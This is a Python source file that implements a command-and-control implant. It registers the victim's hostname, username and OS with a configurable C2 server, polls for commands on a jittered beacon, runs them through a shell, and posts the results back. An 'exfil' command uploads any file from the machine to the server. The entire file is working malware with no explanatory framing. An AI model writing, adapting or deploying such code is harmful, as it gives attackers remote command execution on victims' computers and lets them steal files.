#Sohan Patel

import requests, subprocess, os, sys, time, socket, platform, uuid, random

# ── Config ────────────────────────────────────────────────────────────────────
C2_HOST   = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
C2_PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 4444
BASE_URL  = f"http://{C2_HOST}:{C2_PORT}"
SLEEP     = 5        # seconds between beacons
JITTER    = 2        # ± random jitter so beacons aren't perfectly regular
AGENT_ID  = str(uuid.uuid4())[:8]   # short random id

# ── Registration ──────────────────────────────────────────────────────────────

def register():
    data = {
        "id":       AGENT_ID,
        "hostname": socket.gethostname(),
        "username": os.environ.get("USERNAME") or os.environ.get("USER", "?"),
        "os":       platform.platform(),
    }
    try:
        requests.post(f"{BASE_URL}/register", json=data, timeout=5)
    except Exception:
        pass   # server might not be up yet; keep trying


# ── Command execution ─────────────────────────────────────────────────────────

def run_cmd(cmd):
    """Run shell command, return stdout+stderr as a string."""
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30,
        )
        return (result.stdout + result.stderr).strip() or "(no output)"
    except subprocess.TimeoutExpired:
        return "(command timed out)"
    except Exception as e:
        return f"(error: {e})"


# ── File exfiltration ─────────────────────────────────────────────────────────

def exfil_file(path):
    """Read a file and POST it to the server."""
    path = path.strip()
    if not os.path.isfile(path):
        return f"(file not found: {path})"
    try:
        with open(path, "rb") as f:
            data = f.read()
        r = requests.post(
            f"{BASE_URL}/upload/{AGENT_ID}",
            params={"name": os.path.basename(path)},
            data=data,
            timeout=15,
        )
        return f"(exfilled {len(data)} bytes: {os.path.basename(path)})"
    except Exception as e:
        return f"(exfil error: {e})"


# ── Main beacon loop ──────────────────────────────────────────────────────────

def beacon():
    register()
    while True:
        try:
            resp = requests.get(f"{BASE_URL}/cmd/{AGENT_ID}", timeout=5)
            cmd  = resp.json().get("cmd", "").strip()

            if cmd:
                # Special built-in: exfil <path>
                if cmd.lower().startswith("exfil "):
                    path   = cmd[6:]
                    output = exfil_file(path)
                else:
                    output = run_cmd(cmd)

                requests.post(
                    f"{BASE_URL}/result/{AGENT_ID}",
                    json={"cmd": cmd, "output": output},
                    timeout=10,
                )

        except Exception:
            pass   # silently retry on network errors

        sleep_time = SLEEP + random.uniform(-JITTER, JITTER)
        time.sleep(max(1, sleep_time))


if __name__ == "__main__":
    beacon()